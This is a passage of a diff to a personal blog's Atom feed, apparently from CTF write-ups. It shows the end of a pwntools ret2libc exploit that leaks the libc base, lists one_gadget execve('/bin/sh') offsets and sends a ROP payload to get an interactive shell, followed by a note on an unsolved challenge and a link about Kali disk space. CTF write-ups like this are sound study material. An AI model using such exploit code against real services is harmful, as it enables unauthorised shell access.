+p.recv()
+print('libc_base = ' + hex(libc_base))
+
+# ret2libc
+'''
+0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL || r15 is a valid argv
+  [r12] == NULL || r12 == NULL || r12 is a valid envp
+
+0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL || r15 is a valid argv
+  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+
+0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL || rsi is a valid argv
+  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+
+'''
+one_gadget = [0xe6aee, 0xe6af1, 0xe6af4]
+pop_rdx_r12 = libc_base + 0x000000000011c1e1
+print(hex(pop_rdx_r12))
+one = libc_base + one_gadget[1]
+print(hex(one))
+# gdb.attach(p)
+payload = b'a' * 0x20 + b'deadbeef' + p64(pop_rdx_r12) + p64(0)*2 +  p64(one)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="savetheprincess">SavethePrincess</h1>
+<p>不会写，待补充</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[kali磁盘不足问题]]></title>
+        <id>https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/</id>
+        <link href="https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/">
+        </link>
+        <updated>2024-06-06T03:43:00.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_41359358/article/details/138281097?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;utm_relevant_index=5">一遍过</a></p>
+]]></content>
+    </entry>
+</feed>
